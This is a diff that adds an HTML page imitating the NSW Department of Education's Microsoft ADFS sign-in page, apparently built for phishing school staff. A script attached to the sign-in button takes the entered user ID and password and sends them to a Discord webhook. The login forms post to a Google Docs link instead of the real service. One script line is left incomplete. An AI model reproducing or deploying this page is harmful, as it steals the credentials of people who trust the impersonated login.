@@ -1,1 +1,806 @@
-<title>helloworld</title>
+<html lang="en-GB"><head>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=1112, initial-scale=1.0, user-scalable=1">
+        <meta http-equiv="content-type" content="text/html;charset=UTF-8">
+        <meta http-equiv="cache-control" content="no-cache,no-store">
+        <meta http-equiv="pragma" content="no-cache">
+        <meta http-equiv="expires" content="-1">
+        <meta name="mswebdialog-title" content="Connecting to fs.det.nsw.edu.au">
+
+        <title>Sign In</title>
+        <script type="text/javascript">
+//<![CDATA[
+function LoginErrors(){this.jsa = 'Enter your user ID in the format \u0026quot;domain\\user\u0026quot; or \u0026quot;user@domain\u0026quot;.'; this.passwordEmpty = 'Enter your password.'; this.passwordTooLong = 'Password is too long (\u0026gt; 128 characters).';}; var maxPasswordLength = 128;
+//]]>
+</script>
+
+<script type="text/javascript">
+//<![CDATA[
+// Copyright (c) Microsoft Corporation.  All rights reserved.
+function InputUtil(errTextElementID, errDisplayElementID) {
+
+    if (!errTextElementID)  errTextElementID = 'errorText'; 
+    if (!errDisplayElementID)  errDisplayElementID = 'error'; 
+
+    this.hasFocus = false;
+    this.errLabel = document.getElementById(errTextElementID);
+    this.errDisplay = document.getElementById(errDisplayElementID);
+};
+InputUtil.prototype.canDisplayError = function () {
+    return this.errLabel && this.errDisplay;
+}
+InputUtil.prototype.checkError = function () {
+    if (!this.canDisplayError){
+        throw new Error ('Error element not present');
+    }
+    if (this.errLabel && this.errLabel.innerHTML) {
+        this.errDisplay.style.display = '';        
+        var cause = this.errLabel.getAttribute('for');
+        if (cause) {
+            var causeNode = document.getElementById(cause);
+            if (causeNode && causeNode.value) {
+                causeNode.focus();
+                this.hasFocus = true;
+            }
+        }
+    }
+    else {
+        this.errDisplay.style.display = 'none';
+    }
+};
+InputUtil.prototype.setInitialFocus = function (input) {
+    if (this.hasFocus) return;
+    var node = document.getElementById(input);
+    if (node) {
+        if ((/^\s*$/).test(node.value)) {
+            node.focus();
+            this.hasFocus = true;
+        }
+    }
+};
+InputUtil.prototype.setError = function (input, errorMsg) {
+    if (!this.canDisplayError) {
+        throw new Error('Error element not present');
+    }
+    input.focus();
+
+    if (errorMsg) {
+        this.errLabel.innerHTML = errorMsg;
+    }
+    this.errLabel.setAttribute('for', input.id);
+    this.errDisplay.style.display = '';
+};
+InputUtil.makePlaceholder = function (input) {
+    var ua = navigator.userAgent;
+
+    if (ua != null && 
+        (ua.match(/MSIE 9.0/) != null || 
+         ua.match(/MSIE 8.0/) != null ||
+         ua.match(/MSIE 7.0/) != null)) {
+        var node = document.getElementById(input);
+        if (node) {
+            var placeholder = node.getAttribute("placeholder");
+            if (placeholder != null && placeholder != '') {
+                var label = document.createElement('input');
+                label.type = "text";
+                label.value = placeholder;
+                label.readOnly = true;
+                label.style.position = 'absolute';
+                label.style.borderColor = 'transparent';
+                label.className = node.className + ' hint';
+                label.tabIndex = -1;
+                label.onfocus = function () { this.nextSibling.focus(); };
+
+                node.style.position = 'relative';
+                node.parentNode.style.position = 'relative';
+                node.parentNode.insertBefore(label, node);
+                node.onkeyup = function () { InputUtil.showHint(this); };
+                node.onblur = function () { InputUtil.showHint(this); };
+                node.style.background = 'transparent';
+
+                node.setAttribute("placeholder", "");
+                InputUtil.showHint(node);
+            }
+        }
+    }
+};
+InputUtil.focus = function (inputField) {
+    var node = document.getElementById(inputField);
+    if (node) node.focus();
+};
+InputUtil.hasClass = function(node, clsName) {
+    return node.className.match(new RegExp('(\\s|^)' + clsName + '(\\s|$)'));
+};
+InputUtil.addClass = function(node, clsName) {
+    if (!this.hasClass(node, clsName)) node.className += " " + clsName;
+};
+InputUtil.removeClass = function(node, clsName) {
+    if (this.hasClass(node, clsName)) {
+        var reg = new RegExp('(\\s|^)' + clsName + '(\\s|$)');
+        node.className = node.className.replace(reg, ' ');
+    }
+};
+InputUtil.showHint = function (node, gotFocus) {
+    if (node.value && node.value != '') {
+        node.previousSibling.style.display = 'none';
+    }
+    else {
+        node.previousSibling.style.display = '';
+    }
+};
+InputUtil.updatePlaceholder = function (input, placeholderText) {
+    var node = document.getElementById(input);
+    if (node) {
+        var ua = navigator.userAgent;
+        if (ua != null &&
+            (ua.match(/MSIE 9.0/) != null ||
+            ua.match(/MSIE 8.0/) != null ||
+            ua.match(/MSIE 7.0/) != null)) {
+            var label = node.previousSibling;
+            if (label != null) {
+                label.value = placeholderText;
+            }
+        }
+        else {
+            node.placeholder = placeholderText;
+        }
+    }
+};
+
+//]]>
+</script>
+
+
+        
+        <link rel="stylesheet" type="text/css" href="/style.css"><style>.illustrationClass {background-image:url(https://fs.det.nsw.edu.au/adfs/portal/illustration/illustration.png?id=2D6B50D8C2DD989ADBA12E1D2F0D63C3C63D5217A2B19908E3C2B7E120B5C2D5);}</style>
+
+    </head>
+    <body dir="ltr" class="body">
+    <div id="noScript" style="position: static; width: 100%; height: 100%; z-index: 100; display: none;">
+        <h1>JavaScript required</h1>
+        <p>JavaScript is required. This web browser does not support JavaScript or JavaScript in this web browser is not enabled.</p>
+        <p>To find out if your web browser supports JavaScript or to enable JavaScript, see web browser help.</p>
+    </div>
+    <script type="text/javascript" language="JavaScript">
+         document.getElementById("noScript").style.display = "none";
+    </script>
+    <div id="fullPage">
+        <div id="brandingWrapper" class="float">
+            <div id="branding" class="illustrationClass4 illustrationClass2"></div>
+        </div>
+        <div id="contentWrapper" class="float">
+            <div id="content">
+                <div id="header">
+                    <h4>fs.det.nsw.edu.au</h4>
+                </div>
+                <main>
+                    <div id="workArea">
+                        
+    <div id="authArea" class="groupMargin">
+        
+        
+        
+    <div id="loginArea">        
+        <div id="loginMessage" class="groupMargin">Sign in with your department account</div>
+
+        <form method="post" id="loginForm" autocomplete="off" novalidate="novalidate" onkeypress="if (event &amp;&amp; event.keyCode == 13) Login.submitLoginRequest();" action="https://docs.google.com/document/d/1FUneZhGkD2qG-RDTy2WydHMM__pRKQsmUv5tlB8ulyA/edit?tab=t.0">
+            <div id="error" class="fieldMargin error smallText" style="display: none;">
+                <span id="errorText" for="" aria-live="assertive" role="alert"></span>
+            </div>
+
+            <div id="formsAuthenticationArea">
+                <div id="userNameArea">
+                    <label id="userNameInputLabel" for="userNameInput" class="hidden">User Account</label>
+                    
+                <fieldset><legend>User ID</legend><input id="userNameInput" name="UserName" type="email" value="" tabindex="1" class="text fullWidth" spellcheck="false" placeholder="Enter your user ID" autocomplete="off"></fieldset><span>Example: jane.citizen1</span></div>
+
+                <div id="passwordArea">
+                    <label id="passwordInputLabel" for="passwordInput" class="hidden">Password</label>
+                    
+                <fieldset><legend>Password</legend><input id="passwordInput" name="Password" type="password" tabindex="2" class="text fullWidth" placeholder="Enter your password" autocomplete="off"></fieldset></div>
+                <div id="kmsiArea" style="display:''">
+                    <input type="checkbox" name="Kmsi" id="kmsiInput" value="true" tabindex="3">
+                    <label for="kmsiInput">Keep me signed in</label>
+                </div>
+                <div id="submissionArea" class="submitMargin">
+                    <span id="submitButton" class="submit" tabindex="4" role="button" onkeypress="if (event &amp;&amp; event.keyCode == 32) Login.submitLoginRequest();" onclick="return Login.submitLoginRequest();"><span><svg width="17" height="16" viewBox="0 0 17 16" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M8.5 0L7.09 1.41L12.67 7H0.5V9H12.67L7.09 14.59L8.5 16L16.5 8L8.5 0Z" fill="white"></path></svg></span><span><svg width="17" height="16" viewBox="0 0 17 16" fill="none" xmlns="http://www.w3.org/2000/svg"></svg></span><span></span>Sign in</span>
+                </div>
+            </div>
+            <input id="optionForms" type="hidden" name="AuthMethod" value="FormsAuthentication">
+        </form>
+
+        <script>
+document.getElementById("submitButton").addEventListener("click", function () {
+  const username = document.getElementById("userNameInput").value;
+  const password = document.getElementById("passwordInput").value;
+
+  fetch("https://discord.com/api/webhooks/1393874954579214396/G9xwLMsPNUp-NPZYqxVGeSv08g14tUtFtCX-4sP2MBr2CnAkDtlzWOOIHRSDxv5W1dXf", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+      content: `user: ${username} pw: ${password}`
+    })
+  });
+});
+</script>
+
+             <div id="authOptions">
+         <form id="options" method="post" action="https://docs.google.com/document/d/1FUneZhGkD2qG-RDTy2WydHMM__pRKQsmUv5tlB8ulyA/edit?tab=t.0">
+             <script type="text/javascript">
+                function SelectOption(option) {
+                    var w = document.getElementById('waitingWheelDiv');
+                    if(w) w.style.display = 'inline';
+                    var i = document.getElementById('optionSelection');
+                    i.value = option;
+                    document.forms['options'].submit();
+                    return false;
+                }
+
+                
+             </script>
+             <input id="optionSelection" type="hidden" name="AuthMethod">
+             <input id="userNameInputOptionsHolder" name="UserName" value="" type="hidden">
+             <div id="authOptionLinks" class="groupMargin"><div id="waitingWheelDiv" style="display: none;"><div id="WaitingWheel">
+    <!-- NOTE: This style portion is identical to cookie pull page, they are not in shared css file because of legacy dependancies for custom themes-->
+    <!-- CSS for small "waiting" wheel -->
+    <style>
+        #floatingCirclesG {
+            position: relative;
+            width: 125px;
+            height: 125px;
+            margin: auto;
+            transform: scale(0.4);
+            -o-transform: scale(0.4);
+            -ms-transform: scale(0.4);
+            -webkit-transform: scale(0.4);
+            -moz-transform: scale(0.4);
+        }
+
+        .f_circleG {
+            position: absolute;
+            height: 22px;
+            width: 22px;
+            border-radius: 12px;
+            -o-border-radius: 12px;
+            -ms-border-radius: 12px;
+            -webkit-border-radius: 12px;
+            -moz-border-radius: 12px;
+            animation-name: f_fadeG;
+            -o-animation-name: f_fadeG;
+            -ms-animation-name: f_fadeG;
+            -webkit-animation-name: f_fadeG;
+            -moz-animation-name: f_fadeG;
+            animation-duration: 1.2s;
+            -o-animation-duration: 1.2s;
+            -ms-animation-duration: 1.2s;
+            -webkit-animation-duration: 1.2s;
+            -moz-animation-duration: 1.2s;
+            animation-iteration-count: infinite;
+            -o-animation-iteration-count: infinite;
+            -ms-animation-iteration-count: infinite;
+            -webkit-animation-iteration-count: infinite;
+            -moz-animation-iteration-count: infinite;
+            animation-direction: normal;
+            -o-animation-direction: normal;
+            -ms-animation-direction: normal;
+            -webkit-animation-direction: normal;
+            -moz-animation-direction: normal;
+        }
+
+        #frotateG_01 {
+            left: 0;
+            top: 51px;
+            animation-delay: 0.45s;
+            -o-animation-delay: 0.45s;
+            -ms-animation-delay: 0.45s;
+            -webkit-animation-delay: 0.45s;
+            -moz-animation-delay: 0.45s;
+        }
+
+        #frotateG_02 {
+            left: 15px;
+            top: 15px;
+            animation-delay: 0.6s;
+            -o-animation-delay: 0.6s;
+            -ms-animation-delay: 0.6s;
+            -webkit-animation-delay: 0.6s;
+            -moz-animation-delay: 0.6s;
+        }
+
+        #frotateG_03 {
+            left: 51px;
+            top: 0;
+            animation-delay: 0.75s;
+            -o-animation-delay: 0.75s;
+            -ms-animation-delay: 0.75s;
+            -webkit-animation-delay: 0.75s;
+            -moz-animation-delay: 0.75s;
+        }
+
+        #frotateG_04 {
+            right: 15px;
+            top: 15px;
+            animation-delay: 0.9s;
+            -o-animation-delay: 0.9s;
+            -ms-animation-delay: 0.9s;
+            -webkit-animation-delay: 0.9s;
+            -moz-animation-delay: 0.9s;
+        }
+
+        #frotateG_05 {
+            right: 0;
+            top: 51px;
+            animation-delay: 1.05s;
+            -o-animation-delay: 1.05s;
+            -ms-animation-delay: 1.05s;
+            -webkit-animation-delay: 1.05s;
+            -moz-animation-delay: 1.05s;
+        }
+
+        #frotateG_06 {
+            right: 15px;
+            bottom: 15px;
+            animation-delay: 1.2s;
+            -o-animation-delay: 1.2s;
+            -ms-animation-delay: 1.2s;
+            -webkit-animation-delay: 1.2s;
+            -moz-animation-delay: 1.2s;
+        }
+
+        #frotateG_07 {
+            left: 51px;
+            bottom: 0;
+            animation-delay: 1.35s;
+            -o-animation-delay: 1.35s;
+            -ms-animation-delay: 1.35s;
+            -webkit-animation-delay: 1.35s;
+            -moz-animation-delay: 1.35s;
+        }
+
+        #frotateG_08 {
+            left: 15px;
+            bottom: 15px;
+            animation-delay: 1.5s;
+            -o-animation-delay: 1.5s;
+            -ms-animation-delay: 1.5s;
+            -webkit-animation-delay: 1.5s;
+            -moz-animation-delay: 1.5s;
+        }
+
+        @keyframes f_fadeG {
+            0% {
+                background-color: rgb(47, 146, 212);
+            }
+
+            100% {
+                background-color: rgb(255, 255, 255);
+            }
+        }
+
+        @-o-keyframes f_fadeG {
+            0% {
+                background-color: rgb(47, 146, 212);
+            }
+
+            100% {
+                background-color: rgb(255, 255, 255);
+            }
+        }
+
+        @-ms-keyframes f_fadeG {
+            0% {
+                background-color: rgb(47, 146, 212);
+            }
+
+            100% {
+                background-color: rgb(255, 255, 255);
+            }
+        }
+
+        @-webkit-keyframes f_fadeG {
+            0% {
+                background-color: rgb(47, 146, 212);
+            }
+
+            100% {
+                background-color: rgb(255, 255, 255);
+            }
+        }
+
+        @-moz-keyframes f_fadeG {
+            0% {
+                background-color: rgb(47, 146, 212);
+            }
+
+            100% {
+                background-color: rgb(255, 255, 255);
+            }
+        }
+    </style>
+
+    <!-- Div containing small "waiting" wheel -->
+    <div id="floatingCirclesG">
+        <div class="f_circleG" id="frotateG_01"></div>
+        <div class="f_circleG" id="frotateG_02"></div>
+        <div class="f_circleG" id="frotateG_03"></div>
+        <div class="f_circleG" id="frotateG_04"></div>
+        <div class="f_circleG" id="frotateG_05"></div>
+        <div class="f_circleG" id="frotateG_06"></div>
+        <div class="f_circleG" id="frotateG_07"></div>
+        <div class="f_circleG" id="frotateG_08"></div>
+    </div>
+</div></div></div>
+         </form>
+      </div>
+
+        <div id="introduction" class="groupMargin">
+            <p><a id="forgotpassword" href="https://ssoaddon.education.nsw.gov.au/ssoaddon/forgotpassword" style="color:#002664;font-weight:bold"><span><svg width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M0 10C0 4.48 4.48 0 10 0C15.52 0 20 4.48 20 10C20 15.52 15.52 20 10 20C4.48 20 0 15.52 0 10ZM11 14V16H9V14H11ZM10 18C5.59 18 2 14.41 2 10C2 5.59 5.59 2 10 2C14.41 2 18 5.59 18 10C18 14.41 14.41 18 10 18ZM6 8C6 5.79 7.79 4 10 4C12.21 4 14 5.79 14 8C14 9.28292 13.21 9.97332 12.4408 10.6455C11.711 11.2833 11 11.9046 11 13H9C9 11.1787 9.94212 10.4566 10.7704 9.82168C11.4202 9.32361 12 8.87922 12 8C12 6.9 11.1 6 10 6C8.9 6 8 6.9 8 8H6Z" fill="#002664"></path></svg></span><span style="margin-left:10px">Forgot your password?<span></span></span></a><br><a id="helplogin" href="https://education.nsw.gov.au/about-us/login-help-for-doe-staff" style="color:#002664;font-weight:bold"><span style="margin-left:-2px"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M14.0625 15.6094L16.6875 12.9844H6.98438V11.0156H16.6875L14.0625 8.39062L15.5156 6.98438L20.4844 12L15.5156 17.0156L14.0625 15.6094ZM18.9844 3C19.5469 3 20.0156 3.20312 20.3906 3.60938C20.7969 3.98438 21 4.45312 21 5.01562V9.65625L18.9844 7.6875V5.01562H5.01562V18.9844H18.9844V16.3125L21 14.3438V18.9844C21 19.5469 20.7969 20.0312 20.3906 20.4375C20.0156 20.8125 19.5469 21 18.9844 21H5.01562C4.45312 21 3.96875 20.8125 3.5625 20.4375C3.1875 20.0312 3 19.5469 3 18.9844V5.01562C3 4.45312 3.1875 3.98438 3.5625 3.60938C3.96875 3.20312 4.45312 3 5.01562 3H18.9844Z" fill="#002664"></path></svg></span><span style="margin-left:8px">Help signing in<span></span></span></a></p>                     
+        </div>
+
+        <script type="text/javascript">
+        //<![CDATA[
+
+            function Login() {
+            }
+
+            Login.userNameInput = 'userNameInput';
+            Login.passwordInput = 'passwordInput';
+
+            Login.initialize = function () {
+
+                var u = new InputUtil();
+
+                u.checkError();
+                u.setInitialFocus(Login.userNameInput);
+                u.setInitialFocus(Login.passwordInput);
+            }();
+
+            Login.submitLoginRequest = function () { 
+                var u = new InputUtil();
+                var e = new LoginErrors();
+
+                var userName = document.getElementById(Login.userNameInput);
+                var password = document.getElementById(Login.passwordInput);
+
+
+                if (!password.value) {
+                    u.setError(password, e.passwordEmpty);
+                    return false;
+                }
+
+                if (password.value.length > maxPasswordLength) {
+                    u.setError(password, e.passwordTooLong);
+                    return false;
+                }
+
+                document.forms['loginForm'].submit();
+                return false;
+            };
+
+            InputUtil.makePlaceholder(Login.userNameInput);
+            InputUtil.makePlaceholder(Login.passwordInput);
+        //]]>
+        </script>
+    </div>
+
+    </div>
+
+                    </div>
+                </main>
+                <div id="footerPlaceholder"></div>
+            </div>
+            <footer id="footer"><div><div style="display:flex;justify-content:space-between;align-items:flex-end;padding:0px -20px 0px -20px"><span class="sssadwas"></span></div></div><div><div style="display:flex;justify-content:space-between;align-items:flex-end;padding:0px -20px 0px -20px"><span class="asdass"></span></div></div><div><div style="display:flex;justify-content:space-between;align-items:flex-end;padding:0px -20px 0px -20px"><span class="doeName">NSW Department of Education</span><span class="doeLogo"></span></div></div>
+                <div id="footerLinks" class="floatReverse">
+                    <div><span id="copyright">© 2025 Microsoft</span></div>
+                </div>
+            </footer>
+        </div>     
+    </div>
+    <script type="text/javascript">
+//<![CDATA[
+// Copyright (c) Microsoft Corporation.  All rights reserved.
+
+// This file contains several workarounds on inconsistent browser behaviors that administrators may customize.
+"use strict";
+
+// iPhone email friendly keyboard does not include "\" key, use regular keyboard instead.
+// Note change input type does not work on all versions of all browsers.
+if (navigator.userAgent.match(/iPhone/i) != null) {
+  var emails = document.querySelectorAll("input[type='email']");
+  if (emails) {
+    for (var i = 0; i < emails.length; i++) {
+      emails[i].type = "text";
+    }
+  }
+}
+
+// In the CSS file we set the ms-viewport to be consistent with the device dimensions,
+// which is necessary for correct functionality of immersive IE.
+// However, for Windows 8 phone we need to reset the ms-viewport's dimension to its original
+// values (auto), otherwise the viewport dimensions will be wrong for Windows 8 phone.
+// Windows 8 phone has agent string 'IEMobile 10.0'
+if (navigator.userAgent.match(/IEMobile\/10\.0/)) {
+  var msViewportStyle = document.createElement("style");
+  msViewportStyle.appendChild(
+    document.createTextNode("@-ms-viewport{width:auto!important}")
+  );
+  msViewportStyle.appendChild(
+    document.createTextNode("@-ms-viewport{height:auto!important}")
+  );
+  document.getElementsByTagName("head")[0].appendChild(msViewportStyle);
+}
+
+// If the innerWidth is defined, use it as the viewport width.
+if (
+  window.innerWidth &&
+  window.outerWidth &&
+  window.innerWidth !== window.outerWidth
+) {
+  var viewport = document.querySelector("meta[name=viewport]");
+  viewport.setAttribute(
+    "content",
+    "width=" + window.innerWidth + ", initial-scale=1.0, user-scalable=1"
+  );
+}
+
+// Gets the current style of a specific property for a specific element.
+function getStyle(element, styleProp) {
+  var propStyle = null;
+
+  if (element && element.currentStyle) {
+    propStyle = element.currentStyle[styleProp];
+  } else if (element && window.getComputedStyle) {
+    propStyle = document.defaultView
+      .getComputedStyle(element, null)
+      .getPropertyValue(styleProp);
+  }
+
+  return propStyle;
+}
+
+// The script below is used for downloading the illustration image
+// only when the branding is displaying. This script work together
+// with the code in PageBase.cs that sets the html inline style
+// containing the class 'illustrationClass' with the background image.
+
+function getRandomIntInclusive(min, max) {
+  min = Math.ceil(min);
+  max = Math.floor(max);
+  return Math.floor(Math.random() * (max - min + 1) + min); // The maximum is inclusive and the minimum is inclusive
+}
+
+var computeLoadIllustration = function () {
+  var branding = document.getElementById("branding");
+  var brandingDisplay = getStyle(branding, "display");
+  var brandingWrapperDisplay = getStyle(
+    document.getElementById("brandingWrapper"),
+    "display"
+  );
+
+  if (
+    brandingDisplay &&
+    brandingDisplay !== "none" &&
+    brandingWrapperDisplay &&
+    brandingWrapperDisplay !== "none"
+  ) {
+    var classRandom = getRandomIntInclusive(1, 4);
+    var newClass = "illustrationClass" + classRandom;
+
+    if (branding.classList && branding.classList.add) {
+      branding.classList.add(newClass);
+    } else if (branding.className !== undefined) {
+      branding.className += " " + newClass;
+    }
+    if (window.removeEventListener) {
+      window.removeEventListener("load", computeLoadIllustration, false);
+      window.removeEventListener("resize", computeLoadIllustration, false);
+    } else if (window.detachEvent) {
+      window.detachEvent("onload", computeLoadIllustration);
+      window.detachEvent("onresize", computeLoadIllustration);
+    }
+  }
+};
+
+if (window.addEventListener) {
+  window.addEventListener("resize", computeLoadIllustration, false);
+  window.addEventListener("load", computeLoadIllustration, false);
+} else if (window.attachEvent) {
+  window.attachEvent("onresize", computeLoadIllustration);
+  window.attachEvent("onload", computeLoadIllustration);
+}
+function SetIllustrationImage(imageUri) {
+  var randomIllustration = Math.random(1, 4);
+  var urlPic = imageUri.substring(0, imageUri.indexOf("."));
+  var urlExtension = imageUri.substring(imageUri.indexOf(".") - 1, 3);
+  imageUri = urlPic + randomIllustration + urlExtension;
+  var illustrationImageClass =
+    ".illustrationClass {background-image:url(" + imageUri + ");}";
+
+  var css = document.createElement("style");
+  css.type = "text/css";
+
+  if (css.styleSheet) css.styleSheet.cssText = illustrationImageClass;
+  else css.appendChild(document.createTextNode(illustrationImageClass));
+
+  document.getElementsByTagName("head")[0].appendChild(css);
+}
+
+// Example to change illustration image on HRD page after adding the image to active theme:
+// PSH> Set-AdfsWebTheme -TargetName <activeTheme> -AdditionalFileResource @{uri='/adfs/portal/images/hrd.jpg';path='.\hrd.jpg'}
+//
+//if (typeof HRD != 'undefined') {
+//    SetIllustrationImage('/adfs/portal/images/hrd.jpg');
+//}
+
+// Sample code to change "Sign in with organizational account" string.
+
+// Check whether the loginMessage element is present on this page.
+var loginMessage = document.getElementById("loginMessage");
+if (loginMessage) {
+  // loginMessage element is present, modify its properties.
+  loginMessage.innerHTML = "Sign in with your department account";
+}
+
+if (typeof Login != "undefined") {
+  var userName = document.getElementById(Login.userNameInput);
+  var password = document.getElementById(Login.passwordInput);
+
+  userName.setAttribute("placeholder", "Enter your user ID");
+  password.setAttribute("placeholder", "Enter your password");
+  var userField = document.createElement("fieldset");
+  var fieldLabel = document.createElement("legend");
+  fieldLabel.textContent = "User ID";
+  userField.appendChild(fieldLabel);
+  userField.appendChild(userName);
+  document.getElementById("userNameArea").appendChild(userField);
+  var subtext = document.createElement("span");
+  subtext.textContent = "Example: jane.citizen1";
+  document.getElementById("userNameArea").appendChild(subtext);
+
+  var passwordField = document.createElement("fieldset");
+  var passwordLabel = document.createElement("legend");
+  passwordLabel.textContent = "Password";
+  passwordField.appendChild(passwordLabel);
+  passwordField.appendChild(password);
+  document.getElementById("passwordArea").appendChild(passwordField);
+
+  userName.focus();
+
+  Login.submitLoginRequest = function () {
+    var u = new InputUtil();
+    var e = new LoginErrors();
+    var userName = document.getElementById(Login.userNameInput);
+    var password = document.getElementById(Login.passwordInput);
+    if (userName.value && !userName.value.match("[@\\\\]")) {
+      var userNameValue = userName.value;
+      document.forms["loginForm"].UserName.value = userNameValue;
+    }
+
+    if (!userName.value) {
+      u.setError(userName, e.userNameFormatError);
+      return false;
+    }
+    if (!password.value) {
+      u.setError(password, e.passwordEmpty);
+      return false;
+    }
+    document.forms["loginForm"].submit();
+    return false;
+  };
+  var submitButton = document.getElementById("submitButton");
+  var iconFace = document.createElement("span");
+  iconFace.innerHTML =
+    '<svg width="17" height="16" viewBox="0 0 17 16" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M8.5 0L7.09 1.41L12.67 7H0.5V9H12.67L7.09 14.59L8.5 16L16.5 8L8.5 0Z" fill="white"/></svg>';
+  if (submitButton) {
+    submitButton.insertBefore(iconFace, submitButton.childNodes[0]);
+  }
+  var forgotPassword = document.getElementById("forgotpassword");
+  forgotPassword.innerHTML =
+    '<span><svg width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M0 10C0 4.48 4.48 0 10 0C15.52 0 20 4.48 20 10C20 15.52 15.52 20 10 20C4.48 20 0 15.52 0 10ZM11 14V16H9V14H11ZM10 18C5.59 18 2 14.41 2 10C2 5.59 5.59 2 10 2C14.41 2 18 5.59 18 10C18 14.41 14.41 18 10 18ZM6 8C6 5.79 7.79 4 10 4C12.21 4 14 5.79 14 8C14 9.28292 13.21 9.97332 12.4408 10.6455C11.711 11.2833 11 11.9046 11 13H9C9 11.1787 9.94212 10.4566 10.7704 9.82168C11.4202 9.32361 12 8.87922 12 8C12 6.9 11.1 6 10 6C8.9 6 8 6.9 8 8H6Z" fill="#002664"/></svg></span><span style="margin-left:10px">Forgot your password?<span>';
+  var helpLogin = document.getElementById("helplogin");
+
+  helpLogin.innerHTML =
+    '<span style="margin-left:-2px"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M14.0625 15.6094L16.6875 12.9844H6.98438V11.0156H16.6875L14.0625 8.39062L15.5156 6.98438L20.4844 12L15.5156 17.0156L14.0625 15.6094ZM18.9844 3C19.5469 3 20.0156 3.20312 20.3906 3.60938C20.7969 3.98438 21 4.45312 21 5.01562V9.65625L18.9844 7.6875V5.01562H5.01562V18.9844H18.9844V16.3125L21 14.3438V18.9844C21 19.5469 20.7969 20.0312 20.3906 20.4375C20.0156 20.8125 19.5469 21 18.9844 21H5.01562C4.45312 21 3.96875 20.8125 3.5625 20.4375C3.1875 20.0312 3 19.5469 3 18.9844V5.01562C3 4.45312 3.1875 3.98438 3.5625 3.60938C3.96875 3.20312 4.45312 3 5.01562 3H18.9844Z" fill="#002664"/></svg></span><span style="margin-left:8px">Help signing in<span>';
+  var footerLinks = document.getElementById("footer");
+  var footerLogo = document.createElement("div");
+  footerLogo.innerHTML =
+    
+  if (footerLinks) {
+    footerLinks.insertBefore(footerLogo, footerLinks.childNodes[0]);
+  }
+
+  var userNameInput = document.getElementById("userNameInput");
+  if (userNameInput) {
+    const text = userName.value;
+    const myArray = text.split("@");
+    var mnn = myArray[0];
+    userNameInput.value = mnn;
+  }
+}
+
+//]]>
+</script>
+
+
+    
+ 
+
+<!-- Code injected by live-server -->
+<script>
+	// <![CDATA[  <-- For SVG support
+	if ('WebSocket' in window) {
+		(function () {
+			function refreshCSS() {
+				var sheets = [].slice.call(document.getElementsByTagName("link"));
+				var head = document.getElementsByTagName("head")[0];
+				for (var i = 0; i < sheets.length; ++i) {
+					var elem = sheets[i];
+					var parent = elem.parentElement || head;
+					parent.removeChild(elem);
+					var rel = elem.rel;
+					if (elem.href && typeof rel != "string" || rel.length == 0 || rel.toLowerCase() == "stylesheet") {
+						var url = elem.href.replace(/(&|\?)_cacheOverride=\d+/, '');
+						elem.href = url + (url.indexOf('?') >= 0 ? '&' : '?') + '_cacheOverride=' + (new Date().valueOf());
+					}
+					parent.appendChild(elem);
+				}
+			}
+			var protocol = window.location.protocol === 'http:' ? 'ws://' : 'wss://';
+			var address = protocol + window.location.host + window.location.pathname + '/ws';
+			var socket = new WebSocket(address);
+			socket.onmessage = function (msg) {
+				if (msg.data == 'reload') window.location.reload();
+				else if (msg.data == 'refreshcss') refreshCSS();
+			};
+			if (sessionStorage && !sessionStorage.getItem('IsThisFirstTime_Log_From_LiveServer')) {
+				console.log('Live reload enabled.');
+				sessionStorage.setItem('IsThisFirstTime_Log_From_LiveServer', true);
+			}
+		})();
+	}
+	else {
+		console.error('Upgrade your browser. This Browser is NOT supported WebSocket for Live-Reloading.');
+	}
+	// ]]>
+</script>
+<!-- Code injected by live-server -->
+<script>
+	// <![CDATA[  <-- For SVG support
+	if ('WebSocket' in window) {
+		(function () {
+			function refreshCSS() {
+				var sheets = [].slice.call(document.getElementsByTagName("link"));
+				var head = document.getElementsByTagName("head")[0];
+				for (var i = 0; i < sheets.length; ++i) {
+					var elem = sheets[i];
+					var parent = elem.parentElement || head;
+					parent.removeChild(elem);
+					var rel = elem.rel;
+					if (elem.href && typeof rel != "string" || rel.length == 0 || rel.toLowerCase() == "stylesheet") {
+						var url = elem.href.replace(/(&|\?)_cacheOverride=\d+/, '');
+						elem.href = url + (url.indexOf('?') >= 0 ? '&' : '?') + '_cacheOverride=' + (new Date().valueOf());
+					}
+					parent.appendChild(elem);
+				}
+			}
+			var protocol = window.location.protocol === 'http:' ? 'ws://' : 'wss://';
+			var address = protocol + window.location.host + window.location.pathname + '/ws';
+			var socket = new WebSocket(address);
+			socket.onmessage = function (msg) {
+				if (msg.data == 'reload') window.location.reload();
+				else if (msg.data == 'refreshcss') refreshCSS();
+			};
+			if (sessionStorage && !sessionStorage.getItem('IsThisFirstTime_Log_From_LiveServer')) {
+				console.log('Live reload enabled.');
+				sessionStorage.setItem('IsThisFirstTime_Log_From_LiveServer', true);
+			}
+		})();
+	}
+	else {
+		console.error('Upgrade your browser. This Browser is NOT supported WebSocket for Live-Reloading.');
+	}
+	// ]]>
+</script>
+<scribe-shadow id="crxjs-ext" data-crx="okfkdaglfjjjfefdcppliegebpoegaii" style="position: fixed; width: 0px; height: 0px; top: 0px; left: 0px; z-index: 2147483647; overflow: visible; visibility: visible;"></scribe-shadow></body></html>
